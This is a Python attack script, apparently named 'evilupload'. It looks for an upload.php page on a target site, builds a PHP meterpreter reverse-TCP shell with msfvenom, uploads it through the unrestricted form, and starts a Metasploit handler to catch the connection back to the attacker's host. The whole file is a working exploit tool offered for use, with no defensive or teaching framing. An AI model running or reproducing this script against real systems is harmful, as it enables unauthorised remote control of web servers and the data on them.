#!/usr/bin/env python3
import os
import requests


ascii_banner = """

             _ _             _                 _ 
            (_) |           | |               | |
   _____   ___| |_   _ _ __ | | ___   __ _  __| |
  / _ \ \ / / | | | | | '_ \| |/ _ \ / _` |/ _` |
 |  __/\ V /| | | |_| | |_) | | (_) | (_| | (_| |
  \___| \_/ |_|_|\__,_| .__/|_|\___/ \__,_|\__,_|
                      | |                        
                      |_|                        
"""

METASPLOIT_PATH = '/usr/share/metasploit-framework'  # Update with your Metasploit framework path

def check_upload_page(target_url):
    try:
        response = requests.get(f"{target_url}/upload.php", verify=False)
        return response.status_code == 200
    except:
        return False

def generate_payload(local_ip, lport):
    shell_name = "shell.php"
    cmd = f"{METASPLOIT_PATH}/msfvenom -p php/meterpreter_reverse_tcp LHOST={local_ip} LPORT={lport} -f raw > {shell_name}"
    os.system(cmd)
    return shell_name

def upload_shell(target_url, shell_name):
    upload_url = f"{target_url}/upload.php"

    headers = {
        'User-Agent': 'Mozilla/5.0',  # Use a common User-Agent string
        'Referer': target_url
    }

    # Define the payload data for the POST request
    payload_data = {
        'submit': 'Upload Photo'  # This should match the name of the submit button in the HTML form
    }

    # Use a dictionary to specify the POST data
    data = {
        'submit': (None, 'Upload Photo'),  # The 'submit' field in the HTML form
    }

    # Use a tuple to specify the file to upload
    files = {
        'file': (shell_name, open(shell_name, 'rb'))  # The 'file' field in the HTML form
    }

    response = requests.post(upload_url, headers=headers, data=payload_data, files=files, verify=False)

    if response.status_code == 200:
        print(f"Shell {shell_name} uploaded successfully!")
        shell_url = f"{target_url}/uploads/{shell_name}"
        print(f"Navigate to: {shell_url} to trigger the shell.")

        # Start Metasploit handler
        os.system(f"{METASPLOIT_PATH}/msfconsole -q -x 'use exploit/multi/handler; set payload php/meterpreter_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; exploit'")
    else:
        print(f"Failed to upload {shell_name}.")

if __name__ == "__main__":

    # Gotta have cool ASCII art
    print(ascii_banner)

    target_url = input("Enter the target URL (e.g. http://targetsite.com/uploads): ")
    lhost = input("Enter your LHOST (your IP): ")
    lport = input("Enter your LPORT (e.g. 4444): ")

    if check_upload_page(target_url):
        print("upload.php found! Exploiting...")
        shell_name = generate_payload(lhost, lport)
        upload_shell(target_url, shell_name)
    else:
        print("upload.php not found.")

